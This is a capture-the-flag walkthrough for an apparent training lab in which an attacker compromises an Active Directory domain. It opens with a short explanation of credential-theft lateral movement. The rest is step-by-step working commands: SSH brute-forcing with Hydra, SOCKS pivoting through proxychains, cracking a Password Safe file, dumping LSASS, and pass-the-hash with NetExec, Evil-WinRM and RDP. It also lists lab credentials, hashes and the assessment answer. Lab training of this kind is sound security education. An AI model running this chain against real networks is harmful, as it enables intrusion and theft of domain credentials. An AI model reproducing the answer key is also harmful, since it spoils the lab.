## The Credential Theft Shuffle

The **Credential Theft Shuffle**, as coined by Sean Metcalf, is a systematic approach attackers use to compromise Active Directory environments by exploiting stolen credentials. The process begins with gaining initial access (often through phishing), followed by obtaining local administrator privileges on a machine. Attackers then extract credentials from memory using tools like **Mimikatz** and leverage these credentials to move laterally across the network.

Techniques such as **pass-the-hash (PtH)** and tools like **NetExec** facilitate this lateral movement and further credential harvesting. The ultimate goal is to escalate privileges and gain control over the domain, often by compromising Domain Admin accounts or performing **DCSync** attacks.

Sean emphasizes the importance of implementing security measures such as:
- **LAPS** (Local Administrator Password Solution)
- Enforcing **multi-factor authentication**
- Restricting **administrative privileges**

## Pivoting Primer

The internal hosts (JUMP01, FILE01, DC01) reside on a **private subnet** that is not directly accessible from our attack host. The only externally reachable system is **DMZ01**, which has a second interface connected to the internal network — a classic DMZ setup.

To access internal systems, we must first gain a foothold on DMZ01, then **pivot** — routing our traffic through the compromised host into the private network.

## Solutions

### Part 1: Information Gathering & Gaining Access to DMZ01

**Step 1 — Generate usernames with Username Anarchy**

Save the target's name to a text file, then generate possible usernames:

```bash
./username-anarchy -i /home/kali/username.txt > /home/kali/user_f.txt
```

**Step 2 — Brute-force SSH with Hydra**

We already know Betty's password, so we brute-force the username:

```bash
hydra -L user_f.txt -p 'Texas123!@#' ssh://10.129.234.116
```

**Result:** `jbetty:Texas123!@#`

> Port 22 is open on DMZ01 (appears to be a MikroTik Router).

**Step 3 — Establish a SOCKS Proxy via SSH**

```bash
ssh -D 9051 jbetty@10.129.234.116
```

**Step 4 — Post-login enumeration on DMZ01**

After logging in, check all files in the home directory (including hidden files). A **bash history file** revealed another set of credentials:

```
hwilliam : dealer-screwed-gym1
```

Confirm the internal IP address:

```bash
ifconfig
# Result: 172.16.119.13
```

### Part 2: Internal Network Enumeration & Lateral Movement

With the SOCKS proxy active, enumerate internal hosts via proxychains.

**Enumerate DC01 (172.16.119.11)**

```bash
proxychains4 -f /home/kali/Tools/proxychains4.conf nmap -sT -Pn \
  -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 172.16.119.11

proxychains4 -f /home/kali/Tools/proxychains4.conf nc -vz -w 6 172.16.119.11 3389
```

Open ports on DC01: `53, 88, 135, 139, 389, 445, 464, 593, 636, 3268/3269, 3389, 5985` — confirms it is a Domain Controller.

**Enumerate FILE01 (172.16.119.10)**

```bash
proxychains4 -f /home/kali/Tools/proxychains4.conf nmap -sT -Pn \
  -p 135,445,3389,5985 172.16.119.10

proxychains4 -f /home/kali/Tools/proxychains4.conf nc -vz -w 6 172.16.119.10 445
proxychains4 -f /home/kali/Tools/proxychains4.conf nc -vz -w 6 172.16.119.10 3389
```

Open ports on FILE01: `135, 445, 3389, 5985`

**Access FILE01 via SMB**

Using `hwilliam`'s credentials found in the history file:

```bash
proxychains4 -f /home/kali/Tools/proxychains4.conf smbclient \
  -L //172.16.119.10/ -U 'nexura.htb/hwilliam'

proxychains4 -f /home/kali/Tools/proxychains4.conf smbclient \
  //172.16.119.10/HR -U 'nexura.htb/hwilliam'
```

Navigate to the HR → Archive folder and download: `Employee-Passwords_OLD.psafe3`

**Extract the hash from the Password Safe file**

```bash
python3 /usr/share/john/pwsafe2john.py Employee-Passwords_OLD.psafe3 > psafe_hashes.txt
```

**Crack the Master Password with John the Ripper**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt psafe_hashes.txt
```

**Open Password Safe GUI**

```bash
sudo flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo
sudo flatpak install flathub org.pwsafe.pwsafe -y
flatpak run org.pwsafe.pwsafe
```

Open `Employee-Passwords_OLD.psafe3` with the cracked master password to reveal:

|-----------|---------------------------|--------------|
| jbetty    | xiao-nicer-wheels5        | DMZ01        |

### Part 3: Lateral Movement to JUMP01 (172.16.119.7)

**RDP to JUMP01 with a shared drive**

```bash
proxychains4 -f /home/kali/Tools/proxychains4.conf xfreerdp3 \
  /u:bdavid /p:'caramel-cigars-reply1' /d:nexura.htb /v:172.16.119.7 \
  /cert:ignore /dynamic-resolution "/drive:sf_kalifolder,/media/sf_kalifolder"
```

**Dump LSASS via Task Manager**

1. Open **Task Manager**
2. Go to the **Processes** tab
3. Right-click **Local Security Authority Process**
4. Select **Create dump file**

The file `lsass.DMP` is saved to `%temp%`. Copy it to the shared folder (`sf_kalifolder`) to transfer it back to the attack machine.

**Extract credentials with Pypykatz**

```bash
pypykatz lsa minidump /<path>/lsass.dmp
```

**Result — stom's NTLM hash:**

```
stom : 21ea958524cfd9a7791737f8d2f764fa
```

### Why We Need NTDS.dit

The `NTDS.dit` file is the core Active Directory database, located on every domain controller. It contains:

- **User and group data** — accounts, memberships, SIDs
- **Password hashes** — for every domain user
- **Security settings** — descriptors and policies
- **Domain structure** — OUs, trust relationships, AD objects
- **Schema definitions** — object types and attributes
- **Replication data** — DC synchronization info

If an attacker obtains `NTDS.dit` + the SYSTEM registry hive, they can perform:
- **Pass-the-hash attacks**
- **Credential cracking** (e.g., with Hashcat)
- **Full domain compromise**

### Part 4: Domain Controller Compromise (172.16.119.11)

**Dump NTDS.dit with NetExec (Pass-the-Hash)**

No need to crack `stom`'s hash — use PtH directly:

```bash
proxychains4 -f /home/kali/Tools/proxychains4.conf netexec smb 172.16.119.11 \
  -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M ntdsutil
```

**Answer to the assessment question:**

> **What is the NTLM hash of NEXURA\Administrator?**
>
> `36e09e1e6ade94d63fbcab5e5b8d6d23`

**Gain CLI access via Evil-WinRM**

```bash
proxychains4 -f /home/kali/Tools/proxychains4.conf evil-winrm \
  -i 172.16.119.11 -u Administrator -H 36e09e1e6ade94d63fbcab5e5b8d6d23
```

**Enable Restricted Admin Mode for RDP PtH**

Restricted Admin Mode is disabled by default. Enable it via registry:

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa \
  /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

**RDP to DC01 using Pass-the-Hash**

```bash
proxychains4 -f /home/kali/Tools/proxychains4.conf xfreerdp3 \
  /u:Administrator /pth:36e09e1e6ade94d63fbcab5e5b8d6d23 \
  /d:nexura.htb /v:172.16.119.11 /cert:ignore
```

**Full control of the Domain Controller achieved.**
